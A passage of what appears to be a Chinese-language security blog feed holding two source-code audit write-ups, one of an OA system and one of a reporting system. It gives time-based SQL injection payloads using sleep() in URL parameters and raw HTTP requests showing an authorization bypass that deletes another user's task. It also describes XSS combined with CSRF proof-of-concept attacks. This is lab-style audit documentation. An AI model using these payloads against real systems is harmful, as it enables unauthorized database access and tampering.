+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">alph=A&amp;amp;outtype=&amp;#39;and+sleep(5)--+qwe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ alph等于是为了让前面的判断有数据，这样我们才能执行后面的sleep函数。&lt;/p>
+&lt;h5 id="basekey">baseKey
+&lt;/h5>&lt;p>​ 与前一个同理，payload如下：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">alph=A&amp;amp;outtype=&amp;amp;baseKey=&amp;#39;and+sleep(4)--+qwe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="notice-mapperxml">notice-mapper.xml
+&lt;/h4>&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/6.png"
+width="851"
+height="307"
+srcset="https://hadagaga.github.io/p/oasys-1/6_hu6635425473051422549.png 480w, https://hadagaga.github.io/p/oasys-1/6_hu653821516388796718.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="277"
+data-flex-basis="665px"
+>&lt;/p>
+&lt;p>​ 同样的，我们向上追溯：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/7.png"
+width="948"
+height="762"
+srcset="https://hadagaga.github.io/p/oasys-1/7_hu287626781016875652.png 480w, https://hadagaga.github.io/p/oasys-1/7_hu11615501930286636236.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="124"
+data-flex-basis="298px"
+>&lt;/p>
+&lt;p>​ 根据路由，我们来到通知列表，又根据查询语句猜测，该处实现的功能点是搜索功能。随便搜索后抓包，抓得如下数据包&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/informlistpaging?baseKey=&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">172.21.46.127:8888&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html, */*; q=0.01&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">X-Requested-With&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">XMLHttpRequest&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://172.21.46.127:8888/infromlist&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">JSESSIONID=1E514058317178F919F2084D177556DE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 直接扔给sqlmap就能跑出来，payload如下：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">http://172.21.46.127:8888/informlistpaging?baseKey=&amp;#39; AND (SELECT 7001 FROM (SELECT(SLEEP(5)))nIdf) AND &amp;#39;FglX&amp;#39;=&amp;#39;FglX
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="2任意文件操控读取写入上传">2、任意文件操控（读取，写入，上传）
+&lt;/h3>&lt;p>​ 根据前端的文件管理里的文件管理功能点，点击上传，定位路由在/fileupload。&lt;/p>
+&lt;p>​ 经过审计和测试发现确实不拦截任何的文件上传，但是由于该项目不解析JSP，jar包也无法执行，文件的名字也遭到了修改，无法目录穿透，因此该漏洞无法利用。&lt;/p>
+&lt;p>​ 同时该功能点中也存在下载文件的功能，但是由于该下载功能使用的是id查询数据库中文件的信息，再进行下的方式进行的下载，因此不存在任意文件下载。&lt;/p>
+&lt;p>​ 并未找到文件读取的功能点。&lt;/p>
+&lt;h3 id="3ssrf">3、SSRF
+&lt;/h3>&lt;p>​ 该项目没有找到远程请求的实现。&lt;/p>
+&lt;h3 id="4xxe">4、XXE
+&lt;/h3>&lt;p>​ 项目中没有找到解析XML的功能点。&lt;/p>
+&lt;h3 id="5模板注入">5、模板注入
+&lt;/h3>&lt;p>​ 根据依赖包中的信息我们可知，该项目使用freemark作为模板引擎，但并未找到任何修改模板和上传模板的功能点。&lt;/p>
+&lt;h3 id="6命令执行">6、命令执行
+&lt;/h3>&lt;p>​ 没有找到命令执行的代码实现&lt;/p>
+&lt;h2 id="三前端渗透测试">三、前端渗透测试
+&lt;/h2>&lt;h3 id="1xss">1、XSS
+&lt;/h3>&lt;p>​ 经过测试，可以发现该项目多处存在XSS漏洞。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/8.png"
+width="1445"
+height="804"
+srcset="https://hadagaga.github.io/p/oasys-1/8_hu8514309906810861152.png 480w, https://hadagaga.github.io/p/oasys-1/8_hu3879482332662643645.png 1024w"
+loading="lazy"
+alt="image-20241122140628778"
+class="gallery-image"
+data-flex-grow="179"
+data-flex-basis="431px"
+>&lt;/p>
+&lt;h3 id="2越权漏洞">2、越权漏洞
+&lt;/h3>&lt;p>​ 创建一个低权限用户，登陆后我们使用该低权限的cookie去测试。&lt;/p>
+&lt;p>​ 经过测试发现该项目多处存在越权漏洞。&lt;/p>
+&lt;p>​ 如类型管理，我们使用admin创建一个test：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/9.png"
+width="1523"
+height="413"
+srcset="https://hadagaga.github.io/p/oasys-1/9_hu1818961424665053049.png 480w, https://hadagaga.github.io/p/oasys-1/9_hu11415567409851486658.png 1024w"
+loading="lazy"
+alt="image-20241122141354390"
+class="gallery-image"
+data-flex-grow="368"
+data-flex-basis="885px"
+>&lt;/p>
+&lt;p>​ 点击删除后抓包，将admin用户的cookie替换为test用户的cookie&lt;/p>
+&lt;p>​ 再查看类型管理我们可以看到test已被删除。&lt;/p>
+&lt;h3 id="3csrf">3、CSRF
+&lt;/h3>&lt;p>​ 我们以test用户的身份写一个便签test：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/10.png"
+width="1362"
+height="677"
+srcset="https://hadagaga.github.io/p/oasys-1/10_hu7499442985235957746.png 480w, https://hadagaga.github.io/p/oasys-1/10_hu15866607112021836877.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="201"
+data-flex-basis="482px"
+>&lt;/p>
+&lt;p>​ 抓包后，使用BP自动创建一个CSRF的利用POC。&lt;/p>
+&lt;p>​ 我们再以管理员的身份去访问这个POC&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/11.png"
+width="1538"
+height="245"
+srcset="https://hadagaga.github.io/p/oasys-1/11_hu16113180370551176022.png 480w, https://hadagaga.github.io/p/oasys-1/11_hu9107400557729841412.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="627"
+data-flex-basis="1506px"
+>&lt;/p>
+&lt;p>​ 可以看到，我们成功触发攻击。从前面我们可知该项目存在多出的XSS漏洞，那么我们XSS+CSRF即可实现以管理员的身份创建一个便签，并对管理实现XSS攻击。&lt;/p>
+&lt;p>​ 以test用户的身份创建一个便签，并写上XSS攻击的payload：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/12.png"
+width="1300"
+height="602"
+srcset="https://hadagaga.github.io/p/oasys-1/12_hu6134039854377880904.png 480w, https://hadagaga.github.io/p/oasys-1/12_hu7979125960218326882.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="215"
+data-flex-basis="518px"
+>&lt;/p>
+&lt;p>​ 同样的我们使用BP创建攻击POC，然后以管理员身份访问&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/oasys-1/13.png"
+width="1874"
+height="233"
+srcset="https://hadagaga.github.io/p/oasys-1/13_hu13999288289494735395.png 480w, https://hadagaga.github.io/p/oasys-1/13_hu1480439493117114094.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="804"
+data-flex-basis="1930px"
+>&lt;/p>
+&lt;p>​ 可以看到成功触发攻击。&lt;/p>
+&lt;p>​ 至此该OA系统审计完毕。&lt;/p></description></item><item><title>Intelligent reporting system-1</title><link>https://hadagaga.github.io/p/intelligent-reporting-system/</link><pubDate>Wed, 13 Nov 2024 13:02:00 +0000</pubDate><guid>https://hadagaga.github.io/p/intelligent-reporting-system/</guid><description>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/cover.jpg" alt="Featured image of post Intelligent reporting system-1" />&lt;p>项目结构：spring boot+maven&lt;/p>
+&lt;h1 id="一项目依赖审计">一、项目依赖审计
+&lt;/h1>&lt;p>项目依赖没有发现已披露的漏洞&lt;/p>
+&lt;h1 id="二单点漏洞审计">二、单点漏洞审计
+&lt;/h1>&lt;h2 id="sql">SQL：
+&lt;/h2>&lt;p>根据依赖包我们可以发现项目使用的mybatis
+所以我们在xml文件中搜索${&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/1.png"
+width="1440"
+height="529"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/1_hu15621525281360465142.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/1_hu16107555740760160020.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="272"
+data-flex-basis="653px"
+>&lt;/p>
+&lt;p>发现有这些地方使用了$，也就是可能存在SQL注入，我们一个一个看：&lt;/p>
+&lt;h3 id="1igreportmapperxml">1、IgReportMapper.xml
+&lt;/h3>&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/2.png"
+width="1633"
+height="202"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/2_hu11219533367954520175.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/2_hu10182886627582233743.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="808"
+data-flex-basis="1940px"
+>&lt;/p>
+&lt;p>向上追溯：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/3.png"
+width="932"
+height="323"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/3_hu6062576054723255661.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/3_hu8637456153874382974.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="288"
+data-flex-basis="692px"
+>&lt;/p>
+&lt;p>猜测这里是我的任务模块的功能实现
+根据这些代码，我们还需要将数据源选择为MySQL
+所以我们创建一个这样的任务：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/4.png"
+width="750"
+height="831"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/4_hu10198424672690783659.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/4_hu9513957381704106125.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="90"
+data-flex-basis="216px"
+>&lt;/p>
+&lt;p>执行后查看日志：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/5.png"
+width="763"
+height="101"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/5_hu14537788405921754133.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/5_hu13275567940787325322.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="755"
+data-flex-basis="1813px"
+>&lt;/p>
+&lt;p>成功获取库名。&lt;/p>
+&lt;h3 id="2tidbmapperxml">2、TidbMapper.xml
+&lt;/h3>&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/6.png"
+width="732"
+height="796"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/6_hu9338582153927743816.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/6_hu14667450419879974581.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="91"
+data-flex-basis="220px"
+>&lt;/p>
+&lt;p>与上一个SQL业务逻辑相同，只是需要修改数据源：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/7.png"
+width="759"
+height="93"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/7_hu8644624211022123723.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/7_hu967548986753345329.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="816"
+data-flex-basis="1958px"
+>&lt;/p>
+&lt;h3 id="3xxljobinfomapperxml">3、XxlJobInfoMapper.xml
+&lt;/h3>&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/8.png"
+width="757"
+height="336"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/8_hu15597229073657593139.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/8_hu694329125377876355.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="225"
+data-flex-basis="540px"
+>&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/9.png"
+width="761"
+height="201"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/9_hu8717516068909695624.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/9_hu4960939266503177764.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="378"
+data-flex-basis="908px"
+>&lt;/p>
+&lt;p>在这个文件中这是一个update语句，我们向上追溯：
+这里没有对传参进行过滤或者修改，且有两个控制器调用了这个update语句，我们一个一个看：&lt;/p>
+&lt;h3 id="jobinfocontrollerjava">JobInfoController.java
+&lt;/h3>&lt;p>这个控制器前端没找到调用的功能点，尝试拼接路由发现缺少描述，查看类的属性也没有描述的属性，所以判断这个控制器已经完全弃用。&lt;/p>
+&lt;h3 id="reportinfocontrollerjava">ReportInfoController.java
+&lt;/h3>&lt;p>经过测试，发现两个注入点均为int类型，且未被使用，因此无法进行SQL注入
+任意文件操作（上传、读取、写入）：
+未找到任何有关文件操作的代码实现&lt;/p>
+&lt;h2 id="ssrf">SSRF:
+&lt;/h2>&lt;p>未找到任何远程HTTP请求的代码实现&lt;/p>
+&lt;h2 id="xxe">XXE:
+&lt;/h2>&lt;p>未找到任何XML解析的代码实现&lt;/p>
+&lt;h2 id="url跳转">URL跳转：
+&lt;/h2>&lt;p>黑盒测试过程中未发现类似于URL的参数&lt;/p>
+&lt;h2 id="模板注入">模板注入：
+&lt;/h2>&lt;p>分析依赖发现使用了Freemark作为模板引擎，但没有找到Freemark的模板&lt;/p>
+&lt;h2 id="spel注入">SpEL注入：
+&lt;/h2>&lt;p>没有找到任何SpEL的实现&lt;/p>
+&lt;h1 id="三前端渗透测试">三、前端渗透测试
+&lt;/h1>&lt;h2 id="xss注入">XSS注入：
+&lt;/h2>&lt;p>1、在SQL注入中，我们发现日志中也存在XSS注入，于是我们创建一个如下的任务：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/11.png"
+width="711"
+height="342"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/11_hu13565065814898104677.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/11_hu15170316702745317532.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="207"
+data-flex-basis="498px"
+>&lt;/p>
+&lt;p>执行后查看日志：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/12.png"
+width="711"
+height="398"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/12_hu9121938953517717840.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/12_hu8465198688130519680.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="178"
+data-flex-basis="428px"
+>&lt;/p>
+&lt;p>在首页中的最近任务耗时，当鼠标悬停于任务名字设置为XSSpayload的任务时，也会触发XSS&lt;/p>
+&lt;h2 id="越权漏洞">越权漏洞：
+&lt;/h2>&lt;p>我们先创建一个test用户，登陆后，保存test用户的cookie，用于测试
+1、我的任务功能存在垂直越权
+在我的任务模块，使用admin用户创建一个任务，再使用test用户创建一个任务。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/13.png"
+width="703"
+height="249"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/13_hu3074865106391145250.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/13_hu9040822787618216841.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="282"
+data-flex-basis="677px"
+>&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/14.png"
+width="706"
+height="234"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/14_hu8413736641479156934.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/14_hu17665590922577804034.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="301"
+data-flex-basis="724px"
+>&lt;/p>
+&lt;p>使用test用户点击删除自己的任务后抓包。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">POST /api/jobinfo/remove HTTP/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: 172.24.95.92:8888
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Length: 8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: application/json, text/plain, */*
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: application/json;charset=UTF-8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Origin: http://172.24.95.92:8888
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Referer: http://172.24.95.92:8888/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Encoding: gzip, deflate
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Language: zh-CN,zh;q=0.9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a332c22757365726e616d65223a2274657374222c2270617373776f7264223a223039386636626364343632316433373363616465346538333236323762346636222c22726f6c65223a302c227065726d697373696f6e223a2231227d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: close
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{&amp;#34;id&amp;#34;:2}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>修改id为admin用户所创建任务的id，也就是3。发送数据包。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/intelligent-reporting-system/15.png"
+width="699"
+height="195"
+srcset="https://hadagaga.github.io/p/intelligent-reporting-system/15_hu12713359592971181498.png 480w, https://hadagaga.github.io/p/intelligent-reporting-system/15_hu10378001879726725093.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="358"
+data-flex-basis="860px"
+>&lt;/p>
+&lt;p>成功删除admin用户的任务，编辑功能同样存在越权漏洞，甚至可以直接将admin用户的任务变为自己的任务
+至此，第一套报表系统源码审计结束。&lt;/p></description></item></channel></rss>
